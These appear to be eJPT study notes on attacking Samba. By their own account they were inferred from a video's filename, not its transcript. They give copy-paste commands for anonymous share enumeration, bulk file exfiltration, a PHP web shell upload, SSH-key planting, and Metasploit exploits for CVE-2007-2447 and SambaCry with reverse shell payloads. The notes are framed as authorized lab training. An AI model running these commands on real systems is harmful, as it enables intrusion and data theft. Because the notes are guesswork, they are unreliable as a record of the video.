# 10 - Exploiting SAMBA (eJPT Study Notes)

Note: No transcript was provided. The following summary is inferred conservatively from the filename/context in an eJPT module on Linux exploitation. The examples reflect typical Samba/SMB enumeration and exploitation flows used in training labs (e.g., anonymous/writable shares, Samba 3.x “username map script” CVE-2007-2447, and general share abuse). Adjust IPs, interfaces, and payloads to your lab and only test systems you are authorized to assess.

## What the video covers (Introduction / big picture)
- Identifying and enumerating SMB/Samba services on Linux targets (ports 139/445).
- Enumerating shares, users, and permissions via null sessions and common tools.
- Pulling sensitive data from accessible shares.
- Exploitation paths:
  - Abuse of anonymous or writable shares to move laterally or gain code execution (e.g., upload to web roots, drop SSH keys).
  - Exploiting known Samba RCEs in older versions (notably CVE-2007-2447 “username map script”/usermap_script, and commonly demonstrated SambaCry CVE-2017-7494 in some labs).
- Post-exploitation basics: verifying privileges and pivoting.

## Flow (ordered)
1. Host discovery and service detection (confirm 139/445 open).
2. Version and script scan with Nmap NSE for SMB.
3. Attempt anonymous/null session; enumerate shares, users, and permissions.
4. Connect to accessible shares (anonymous or with found creds); list and exfiltrate files.
5. Evaluate exploitation avenues:
   - Writable share abuse (e.g., upload web shell if share maps to web root; or drop authorized_keys if home share).
   - Version-based exploitation (searchsploit/metasploit for Samba 2.x/3.x known RCE).
6. Execute exploit and gain shell.
7. Validate access (id/whoami) and proceed with post-exploitation.

## Tools highlighted
- Nmap with SMB NSE scripts
- smbclient
- enum4linux / enum4linux-ng
- smbmap
- rpcclient
- crackmapexec (CME)
- searchsploit (Exploit-DB)
- Metasploit Framework (e.g., exploit/multi/samba/usermap_script, exploit/linux/samba/is_known_pipename)

## Typical command walkthrough (detailed, copy-paste friendly)

Replace:
- TARGET=10.10.10.10
- LHOST=YOUR_ATTACK_BOX_IP
- LPORT=4444
- IFACE=tun0 or your interface as needed

1) Quick port and version scan
```
TARGET=10.10.10.10
nmap -p 139,445 -sC -sV -oN nmap_smb_${TARGET}.txt $TARGET
```

2) SMB-focused enumeration with Nmap NSE
```
nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users $TARGET -oN nmap_smb_enum_${TARGET}.txt
```

3) List shares (attempt null/anonymous)
- Tip: For older Samba (SMB1-only), force SMB1/NT1 dialect.
```
# Anonymous list (null session)
smbclient -L //$TARGET/ -N

# Force SMB1 (if needed for older Samba)
smbclient -L //$TARGET/ -N -m NT1
```

4) Connect to a share (anonymous or with creds)
```
# Anonymous connect
smbclient //$TARGET/SHARE -N

# With credentials (if found)
smbclient //$TARGET/SHARE -U 'user%password'

# Useful smbclient session commands
# (inside smbclient)
recurse ON
prompt OFF
ls
mget *
get filename
put localfile remotefile
```

5) enum4linux / enum4linux-ng (broad enumeration)
```
# Classic
enum4linux -a $TARGET | tee enum4linux_${TARGET}.txt

# Newer fork
enum4linux-ng -A $TARGET | tee enum4linuxng_${TARGET}.txt
```

6) smbmap (permissions and recursive listing)
```
# Try null session
smbmap -H $TARGET

# Force SMB1 for older Samba
smbmap -H $TARGET --signing --no-banner -P 445

# With creds
smbmap -H $TARGET -u user -p 'password'

# Recursively list a share
smbmap -H $TARGET -R SHARE

# Grab files matching a pattern
smbmap -H $TARGET -R SHARE -A 'config|pass|ssh|id_rsa|backup'
```

7) rpcclient (user/share policy via RPC)
```
rpcclient -U "" -N $TARGET
# Inside rpcclient:
srvinfo
enumdomusers
queryuser 0x1f4
getdompwinfo
lookupnames Administrator root nobody
lsaquery
```

8) crackmapexec (quick shares and version)
```
# Null session check
crackmapexec smb $TARGET --shares -u '' -p ''

# With creds
crackmapexec smb $TARGET --shares -u user -p 'password'
```

9) Writable share abuse examples (non-exploit RCE paths)
- If a share maps to a web root (e.g., /var/www/html), upload a web shell and trigger via HTTP:
```
# PHP web shell example (if web server + PHP)
echo '<?php system($_GET["cmd"]); ?>' > shell.php
smbclient //$TARGET/WEBROOT -N -c 'put shell.php'
# Then browse: http://TARGET/shell.php?cmd=id
```
- If you have a user home share, drop an SSH key:
```
# Generate key on attacker
ssh-keygen -t rsa -b 2048 -f id_rsa_smb -N ""

# Upload authorized_keys into target user's ~/.ssh/
smbclient //$TARGET/homes -U 'user%password' -c 'mkdir .ssh; put id_rsa_smb.pub .ssh/authorized_keys'
# Then SSH in:
ssh -i id_rsa_smb user@$TARGET
```

10) Version-based exploitation (searchsploit and Metasploit)
- Identify Samba version from Nmap/enum.
- Look up exploits:
```
searchsploit samba 3.0
searchsploit samba 2.2
searchsploit samba | grep -i 'username map\|usermap\|trans2open\|pipename'
```

11) Metasploit: CVE-2007-2447 “username map script” (Samba 3.0.20–3.0.25rc3)
- Common in training labs; results in remote command execution.
```
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS $TARGET
set RPORT 445
# Choose a simple CMD reverse payload (works well for this exploit)
set PAYLOAD cmd/unix/reverse_bash
set LHOST LHOST
set LPORT LPORT
run
# After shell:
id
uname -a
```
- If reverse_bash fails, try:
```
set PAYLOAD cmd/unix/reverse
# or
set PAYLOAD cmd/unix/reverse_netcat
```

12) Metasploit: SambaCry CVE-2017-7494 (if indicated and share is writable)
- This requires conditions (e.g., ability to write a shared library to a writable share). If an NSE or banner suggests vulnerability:
```
msfconsole -q
use exploit/linux/samba/is_known_pipename
set RHOSTS $TARGET
set RPORT 445
set LHOST LHOST
set LPORT LPORT
run
# Verify:
id
```

13) Mount a share locally (handy for bulk exfil)
```
sudo mkdir -p /mnt/smb
# For older Samba (SMB1):
sudo mount -t cifs //${TARGET}/SHARE /mnt/smb -o guest,vers=1.0
# With creds:
sudo mount -t cifs //${TARGET}/SHARE /mnt/smb -o username=user,password='password',vers=1.0
ls -la /mnt/smb
sudo umount /mnt/smb
```

14) Netcat listener for manual reverses (when triggering custom commands)
```
nc -lvnp 4444
```

## Practical tips
- Force SMB dialect: many vulnerable Samba builds only speak SMB1; use smbclient -m NT1 or mount vers=1.0 if connections fail.
- Null sessions first: anonymous access often yields share lists and sometimes readable/writable shares.
- Recursive grab: inside smbclient, use recurse ON and prompt OFF to bulk-download.
- Use pattern matching: smbmap -A 'pass|config|id_rsa' to quickly find sensitive files.
- Writable ≠ executable: uploading to a share doesn’t execute code by itself; look for shares mapped to web roots or places you can leverage (authorized_keys in home, cron- or script-executed paths).
- Version matters: small version differences in Samba change exploitability. Always confirm the exact version and check searchsploit/metasploit.
- Firewalls/SMB signing: if tools time out or fail, check for SMB signing or firewall rules; try both 139 and 445.
- Stabilize shells: upgrade to a TTY after getting a shell (e.g., python3 -c 'import pty; pty.spawn("/bin/bash")').

## Minimal cheat sheet (one-screen flow)
```
# Scan + enumerate SMB
TARGET=10.10.10.10
nmap -p139,445 -sC -sV $TARGET
nmap -p139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users $TARGET

# List shares (anonymous)
smbclient -L //$TARGET/ -N -m NT1
# Connect to share
smbclient //$TARGET/SHARE -N -m NT1 -c 'recurse ON;prompt OFF;ls'
smbclient //$TARGET/SHARE -N -m NT1 -c 'mget *'

# Broad enum
enum4linux -a $TARGET | tee enum4linux_${TARGET}.txt
smbmap -H $TARGET
rpcclient -U "" -N $TARGET

# Check exploits
searchsploit samba 3.0
# Metasploit (CVE-2007-2447 usermap_script)
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOSTS $TARGET; set RPORT 445; set PAYLOAD cmd/unix/reverse_bash; set LHOST YOUR_IP; set LPORT 4444; run"

# If writable web share, upload web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
smbclient //$TARGET/WEB -N -c 'put shell.php'
# Then: http://TARGET/shell.php?cmd=id
```

## Summary
- This module focuses on identifying and exploiting Samba on Linux. Start with SMB enumeration (Nmap, smbclient, enum4linux, smbmap, rpcclient) and aim to discover shares, permissions, and the Samba version.
- Exploitation commonly follows two routes:
  1) Abuse accessible/writable shares to move toward code execution (e.g., upload a web shell to a web-mapped share or plant SSH keys in a user’s home).
  2) Leverage known Samba RCE vulnerabilities in older versions—particularly CVE-2007-2447 via Metasploit’s usermap_script—once version evidence supports it.
- Validate the shell and proceed with post-exploitation. Always tailor to your environment, and only test with proper authorization.